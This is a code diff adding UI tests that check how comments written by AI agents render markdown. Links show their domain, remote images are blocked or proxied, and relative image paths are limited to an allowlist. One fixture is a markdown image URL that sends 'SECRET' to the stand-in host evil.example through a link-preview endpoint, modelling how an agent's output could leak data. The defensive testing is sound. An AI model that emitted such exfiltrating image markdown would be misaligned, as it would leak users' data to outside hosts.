@@ -1768,3 +1768,113 @@ test("a composer's hint describes its box", async () => {
     ).toBe(hint.id),
   );
 });
+
+const proxied = (src: string) => `/proxy?u=${encodeURIComponent(src)}`;
+
+const bodyBy = (author: CommentData["author"], body: string): CommentData => ({
+  id: author.name,
+  author,
+  body,
+  createdAt: 1,
+});
+const AGENT = { name: "BOQ processor", kind: "agent" as const };
+
+test("an agent's comment says where links go and offers images; a person's doesn't", async () => {
+  const body =
+    "[Datasheet](https://evil.example/a) ![](https://evil.example/p.png)";
+  const agent = await render(
+    <ul>
+      <CommentItem
+        comment={bodyBy(AGENT, body)}
+        agentMarkdown={{ imageProxy: proxied }}
+      />
+    </ul>,
+  );
+  expect(
+    agent.container.querySelector('[data-slot="markdown-link-domain"]')
+      ?.textContent,
+  ).toBe(" (evil.example)");
+  expect(agent.container.querySelector("img")).toBeNull();
+  await expect
+    .element(agent.getByRole("button", { name: /^Show/ }))
+    .toBeVisible();
+  await agent.unmount();
+  const person = await render(
+    <ul>
+      <CommentItem
+        comment={bodyBy({ name: "Asha" }, body)}
+        agentMarkdown={{ imageProxy: proxied }}
+      />
+    </ul>,
+  );
+  expect(
+    person.container.querySelector('[data-slot="markdown-link-domain"]'),
+  ).toBeNull();
+  expect(
+    person.container.querySelector(
+      '[data-slot="markdown-image-blocked"] button',
+    ),
+  ).toBeNull();
+});
+
+test("the deprecated agent flag counts as an agent", async () => {
+  const screen = await render(
+    <ul>
+      <CommentItem
+        comment={{
+          ...bodyBy({ name: "Bot" }, "[Datasheet](https://evil.example/a)"),
+          agent: true,
+        }}
+      />
+    </ul>,
+  );
+  expect(
+    screen.container.querySelector('[data-slot="markdown-link-domain"]'),
+  ).not.toBeNull();
+});
+
+test("with no proxy an agent's relative image still can't call this site", async () => {
+  const screen = await render(
+    <ul>
+      <CommentItem
+        comment={bodyBy(
+          AGENT,
+          "![](/api/v1/link-preview?url=https://evil.example/?d=SECRET)",
+        )}
+      />
+    </ul>,
+  );
+  expect(screen.container.querySelector("img")).toBeNull();
+  await screen.rerender(
+    <ul>
+      <CommentItem
+        comment={bodyBy(AGENT, "![](/files/plan.png)")}
+        agentMarkdown={{ allowedImagePaths: ["/files/"] }}
+      />
+    </ul>,
+  );
+  expect(screen.container.querySelector("img")).not.toBeNull();
+});
+
+test("a thread and a list pass it to their agents' comments", async () => {
+  const comment = bodyBy(AGENT, "![](https://evil.example/p.png)");
+  const thread = await render(
+    <CommentThread
+      thread={{ id: "t", root: comment, replies: [] }}
+      agentMarkdown={{ imageProxy: proxied }}
+    />,
+  );
+  await expect
+    .element(thread.getByRole("button", { name: /^Show/ }))
+    .toBeVisible();
+  await thread.unmount();
+  const list = await render(
+    <CommentList
+      comments={[comment]}
+      agentMarkdown={{ imageProxy: proxied }}
+    />,
+  );
+  await expect
+    .element(list.getByRole("button", { name: /^Show/ }))
+    .toBeVisible();
+});
